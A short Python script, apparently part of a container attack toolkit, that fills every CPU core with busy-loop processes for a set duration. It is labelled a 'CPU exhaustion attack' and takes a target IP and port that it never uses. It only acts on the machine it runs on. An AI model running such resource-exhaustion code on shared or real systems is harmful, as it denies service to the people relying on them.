import multiprocessing
import sys
import time

def cpu_stress():
    """
    Function to max out a CPU core
    """
    while True:
        pass

def cpu_exhaust_container(duration=30):
    """
    CPU exhaustion attack targeting containers
    Creates processes equal to CPU count to maximize impact
    """
    print("[*] Starting CPU exhaustion attack")
    
    try:
        # Get CPU count
        cpu_count = multiprocessing.cpu_count()
        processes = []
        
        # Create process for each CPU
        for _ in range(cpu_count):
            process = multiprocessing.Process(target=cpu_stress)
            process.start()
            processes.append(process)
            
        # Run for specified duration
        time.sleep(duration)
        
        # Cleanup
        for process in processes:
            process.terminate()
            
        print("[*] Attack completed")
        return True
        
    except Exception as e:
        print(f"[!] Attack failed: {str(e)}")
        return False

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: python3 cpu_exhaust_container.py <target_ip> <target_port> <duration>")
        sys.exit(1)
        
    # We don't actually use target_ip and target_port for CPU attack,
    # but we keep the same interface for consistency with other attacks
    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    duration = int(sys.argv[3])
    
    cpu_exhaust_container(duration) 